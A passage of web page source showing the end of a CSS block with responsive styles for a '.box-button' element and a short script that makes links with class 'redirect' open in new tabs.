    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
